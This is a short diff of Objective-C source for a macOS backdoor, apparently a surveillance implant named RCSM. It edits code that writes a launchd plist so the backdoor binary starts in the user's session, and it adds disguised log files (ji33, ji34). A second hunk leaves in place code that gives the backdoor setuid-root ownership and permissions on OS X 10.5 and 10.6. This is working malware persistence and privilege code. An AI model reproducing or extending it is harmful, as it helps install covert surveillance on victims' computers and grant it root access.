@@ -328,11 +328,17 @@ static RCSMUtils *sharedUtils = nil;
                         BACKDOOR_DAEMON_PLIST];
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
+  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", mBackdoorPath];
+  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", mBackdoorPath];
+
   innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
                aLabel, @"Label",
                @"Aqua", @"LimitLoadToSessionType",
                [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments", nil];
+               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
+               errorLog, @"StandardErrorPath",
+               outLog, @"StandardOutPath",
+               nil];
                //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
   
   [rootObj addEntriesFromDictionary: innerDict];
@@ -408,7 +414,6 @@ static RCSMUtils *sharedUtils = nil;
   //
   if (gOSMajor == 10 && (gOSMinor == 5 || gOSMinor == 6))
     {
-      //[self enableSetugidAuth];
       u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
       NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
       NSValue *owner      = [NSNumber numberWithInt: 0];
